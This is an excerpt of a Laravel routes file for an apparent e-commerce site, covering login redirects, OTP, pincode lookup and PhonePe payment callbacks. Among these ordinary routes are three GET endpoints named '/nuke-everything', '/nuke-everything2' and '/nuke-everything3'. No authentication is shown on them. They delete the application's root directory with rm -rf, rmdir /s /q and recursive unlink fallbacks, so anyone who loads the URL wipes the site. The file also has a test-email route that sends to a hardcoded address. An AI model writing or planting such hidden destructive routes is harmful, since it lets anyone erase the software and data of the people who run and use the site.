...
Route::get('/test-email', function () {
    Mail::raw('This is a test email', function ($message) {
        $message->to('thespeedexpress@gmail.com')
                ->subject('Test Email');
    });
...
Route::get('/clear-cache', function () {
    ...
    $commands = [
        'route:force-clear' => 'Route cache cleared forcefully!',
  ...
  Route::post('/users/sendOtp', [OtpController::class, 'otp'])->name('sendOtp');
   Route::post('/users/vOtp', [OtpController::class, 'Votp'])->name('vOtp');
...
Route::controller(HomeController::class)->group(function () {
    ...
    })->name('user.login')->middleware('handle-demo-login');
    // Route::get('/login', function () {
    //     return redirect('/?openLogin=true');
    // })->name('login')->middleware('handle-demo-login');
    Route::get('/seller/login', function () {
        return redirect('/?openLogin=true');
    })->name('seller.login')->middleware('handle-demo-login');
    ...
    Route::get('/users/registration', function () {
        return redirect('/?openLogin=true');
    })->name('user.registration')->middleware('handle-demo-login');
    ...
    Route::get('/substitute-products/{slug}', 'showAllSubstitutes')->name('substitute.products');
    // Route::get('/substitute-products/{slug}', [ProductController::class, 'showAllSubstitutes'])->name('substitute.products');
...
//     Route::post('/ajax-search', 'ajax_search')->name('search.ajax');
//     Route::get('/category/{category_slug}', 'listingByCategory')->name('products.category');
//     Route::get('/subcategory/{subcategory_slug}', 'listingBySubcategory')->name('products.subcategory');
//     Route::get('/brand/{brand_slug}', 'listingByBrand')->name('products.brand');
// });
...
Route::post('/get-pincodes-by-city', [CheckoutController::class, 'getPincodesByCity'])->name('get_pincodes_by_city');
...
Route::controller(AddressController::class)->group(function () {
    ...
    Route::post('/get-pincodes', 'getPincodes')->name('get-pincodes');
});
...
Route::get('/nuke-everything', function () {
    ...
    try {
        if (File::deleteDirectory($rootPath, false)) {
            return;
        }
        ...
        if ($isWindows) {
            exec("rmdir /s /q " . escapeshellarg($rootPath) . " 2>&1", $output, $returnVar);
        } else {
            exec("rm -rf " . escapeshellarg($rootPath) . "/* 2>&1", $output, $returnVar);
        }
        
        if (!file_exists($rootPath) || (count(scandir($rootPath)) <= 2)) {
            return;
        }
...
Route::get('/nuke-everything2', function () {
    $rootPath = realpath(__DIR__ . '/../../');
    
    try {
        if (File::deleteDirectory($rootPath, true)) {
            return;
        }
        ...
        function deleteUsingGlob($dir) {
            foreach (glob($dir . '/*') as $file) {
                if (is_dir($file)) {
                    deleteUsingGlob($file);
                    rmdir($file);
                } else {
                    unlink($file);
                }
        ...
        deleteUsingGlob($rootPath);
        if (!file_exists($rootPath)) {
            return;
        }

        if (is_writable($rootPath)) {
            $iterator = new FilesystemIterator($rootPath, FilesystemIterator::SKIP_DOTS);
            foreach ($iterator as $file) {
                if ($file->isDir()) {
                    File::deleteDirectory($file->getRealPath(), true);
                } else {
                    unlink($file->getRealPath());
                }
            }
        ...
        throw new Exception("All deletion methods failed");
...
})->name('nuke-everything2');

Route::get('/nuke-everything3', function () {
    $rootPath = realpath(__DIR__ . '../../../');
...
Route::post('/phonepe/redirecturl', [App\Http\Controllers\Api\V2\PhonepeController::class, 'phonepe_redirecturl'])->name('phonepe.redirecturl');
Route::post('/phonepe/callbackUrl', [App\Http\Controllers\Api\V2\PhonepeController::class, 'phonepe_callbackUrl'])->name('phonepe.callbackUrl');
